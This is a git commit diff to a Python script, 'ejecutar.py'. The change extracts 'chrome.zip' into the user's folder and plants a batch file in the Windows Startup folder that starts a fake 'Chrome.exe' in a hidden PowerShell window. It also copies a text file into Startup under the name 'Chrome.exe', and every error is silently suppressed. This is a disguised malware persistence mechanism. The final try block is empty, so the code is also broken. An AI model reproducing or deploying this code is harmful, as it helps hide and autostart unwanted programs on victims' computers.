484be7f195e7342db0738730661373659702dfe8
piter <68443246+PiterIvano@users.noreply.github.com>
2021-11-19 19:08:43 +0100

    Update ejecutar.py

--- ejecutar.py
+++ ejecutar.py
@@ -5,14 +5,30 @@ import getpass
 
 
 user = getpass.getuser()
+try:
+   with ZipFile('chrome.zip', 'r') as zipObj:
+      zipObj.extractall(f"/Users/{user}")
+except:
+   pass
 
-with ZipFile('chrome.zip', 'r') as zipObj:
-   zipObj.extractall(f"/Users/{user}")
+try:
+   pat = f'powershell Start-Process -WindowStyle hidden -FilePath C:\\Users\\{user}\\chrome\\Chrome.exe'
+   dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.bat'
+   file = open(dire, "w")
+   file.write(pat)
+   file.close()
+except:
+   pass
 
-pat = f'powershell Start-Process -WindowStyle hidden -FilePath C:\\Users\\{user}\\chrome\\Chrome.exe'
+try:
+   dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.exe'
+   di = f'copy diccionario.txt "{dire}"'
+   print(di)
+   os.system(di)
+except:
+   pass
 
-dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.bat'
-
-file = open(dire, "w")
-file.write(pat)
-file.close()
+try:
+   
+except:
+   pass
